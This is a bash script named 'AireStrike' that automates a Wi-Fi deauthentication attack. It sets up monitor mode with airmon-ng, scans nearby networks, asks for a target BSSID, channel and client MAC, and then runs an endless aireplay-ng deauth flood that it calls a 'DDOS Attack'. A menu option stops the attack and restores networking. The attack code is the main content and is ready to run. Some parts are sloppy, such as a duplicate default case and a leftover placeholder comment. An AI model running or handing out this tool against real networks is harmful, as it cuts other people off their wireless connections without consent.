#!/bin/bash

# Path to the apt update timestamp file
TIMESTAMP_FILE="/var/lib/apt/periodic/apt-update-timestamp"

# Define threshold in seconds (e.g., 86400 seconds = 24 hours)
UPDATE_INTERVAL=86400

# Get current time
NOW=$(date +%s)

# Get the last update time (defaults to 0 if the file doesn't exist)
if [ -f "$TIMESTAMP_FILE" ]; then
    LAST_UPDATE=$(stat -c %Y "$TIMESTAMP_FILE")
else
    LAST_UPDATE=0
fi

# Check if the cache is older than the interval
if [ $((NOW - LAST_UPDATE)) -gt $UPDATE_INTERVAL ]; then
    echo "Package Cache Is Outdated!..Updating package list..."
    sudo apt update
    # Touch timestamp file to mark the last check
    sudo touch "$TIMESTAMP_FILE"
else
    echo "Package Cache Is Up To Date!..Skipping update..."
fi

# Dependency check
for pkg in figlet lolcat pv fastfetch aircrack-ng; do if ! command -v $pkg &>/dev/null; then 
echo "Installing $pkg..."
sudo apt install $pkg -y 
fi 
done

clear

# Ensure figlet is installed
command -v figlet >/dev/null 2>&1 || apt install figlet -y
clear
echo -e "\033[1;34m****=====================================================!!!\033[0m" 
 echo -e "\033[1;31m" 
 figlet -f slant "AIRESTRIKE" 
 echo -e "\033[0m"
 echo -e "\033[1;32mMODDED BY H4CKER\033[0m" | pv -qL 60
echo -e "\033[1;34m****=====================================================!!!\033[0m"

# Space

# Metadata
echo -e "\033[1;34m****=====================================================!!!\033[0m" 
echo -e "\033[1;36m Author :\033[0m H4CKER" 
echo -e "\033[1;36m Version :\033[0m 3.O"
echo -e "\033[1;36m GitHub :\033[0m https://github.com/Electroxcz"
echo -e "\033[1;34m!!!=====================================================****\033[0m" 
echo -e "\n"

echo -e "\033[1;32mWELCOME TO THE WORLD OF MODERN NETWORKING & CYBERSECURITY PENETRATION TESTING\033[0m" | pv -qL 50

# Space

# Menu
echo -e "\e[36m[I]Start DDOS Attack          \e[36m[II]Stop DDOS Attack          \e[36m[E]EXIT" | pv -qL 50

# Space

read -p $'\033[1;33mPlease Choose An Option:\033[0m' SELECT 


case $SELECT in


  I) echo -e "\033[1;36mStarting Network DDOS Attack...\033[0m" | pv -qL 20 
  sleep 3

sudo fastfetch
sleep 2
sudo airmon-ng check kill
sleep 1
sudo iw dev
sleep 1
sudo airmon-ng start wlan0
sleep 4
sudo airmon-ng check kill
sleep 1
sudo airodump-ng --band abg wlan0mon
sleep 3

# Validate BSSID input
while true; do
    echo -n "Enter the Target BSSID: "
    read bssid
    if [[ $bssid =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
        break
    else
        echo "Invalid BSSID format. Example format: AA:BB:CC:DD:EE:FF"
    fi
done

# Validate Channel input
while true; do
    echo -n "Enter the Target Channel (1-170): "
    read channel
    if [[ $channel =~ ^[0-9]+$ ]] && [ "$channel" -ge 1 ] && [ "$channel" -le 170 ]; then
        break
    else
        echo "Invalid channel number. Please enter a number between 1 and 170."
    fi
done

# Validate Client MAC input (Optional)
while true; do
    echo -n "Enter the Target MAC (or press Enter for all): "
    read mac
    if [[ -z "$mac" || $mac =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
    break

    else
        echo "Invalid MAC address format. Example format: AA:BB:CC:DD:EE:FF"
    fi
done

# Execution of Deauthentication Attack
while true; do
echo 'Sniffing The Target $bssid On Channel $channel [if Mac] & Mac Through $mac...'
sudo airodump-ng --bssid $bssid --channel $channel wlan0mon
sleep 3

if
  [ -z "$mac" ]; then
                     sudo aireplay-ng --deauth 0 -a $bssid wlan0mon
            break
else
    sudo aireplay-ng --deauth 0 -a $bssid -c $mac wlan0mon

fi

done

clear

echo -e "\033[1;33m"
echo -e "\n\033[1;33mContinue...\033[0m" | pv -qL 30 
echo -e "\033[0m"
echo -e "\n\033[1;33mEntering The Main Menu...\033[0m" | pv -qL 20 
bash airestrike.sh

  ;;

II) echo -e "\033[1;36mTerminating Network DDOS Attack...\033[0m" | pv -qL 20 
    sleep 3

sudo iw dev
sudo airmon-ng check kill
sleep 1
sudo airmon-ng stop wlan0mon
sleep 1
sudo systemctl restart NetworkManager.service
sleep 3
sudo iw dev
sleep 4
clear

echo -e "\033[1;33m" | pv -qL 20 
echo -e "\033[1;36mActivating Peaceful Mode...\033[0m" | pv -qL 20 
echo -e "\033[1;36mOperation Complete!\033[0m" | pv -qL 20
echo -e "\033[0m" | pv -qL 20
echo -e "\n\033[1;33mEntering The Main Menu...\033[0m" | pv -qL 20 
bash airestrike.sh

  ;;

# ... [Keep other cases unchanged] ...

    E)
      clear
      echo -e "\033[1;33m"
      echo "Thank you for using AireStrike!" | pv -qL 20
      echo "Created by H4CKER from ANON" | pv -qL 20
      echo "Follow on GitHub for updates..!" | pv -qL 20
      echo -e "\033[0m"
      clear
      exit 00
      
      ;;

    *)
      echo -e "\033[1;31mInvalid Option\033[0m" | pv -qL 20 
      sleep 1
      clear
      bash airestrike.sh
      
      ;;

   Q|q) echo -e "\n\033[1;31mExiting AireStrike...\033[0m" 
        clear
        exit 00
        clear

      ;;

   *) echo -e "\033[1;31mInvalid Option\033[0m"
      echo -e "\033[1;31Entering The Main Menu\033[0m"
      clear
      bash airestrike.sh

      ;;
esac
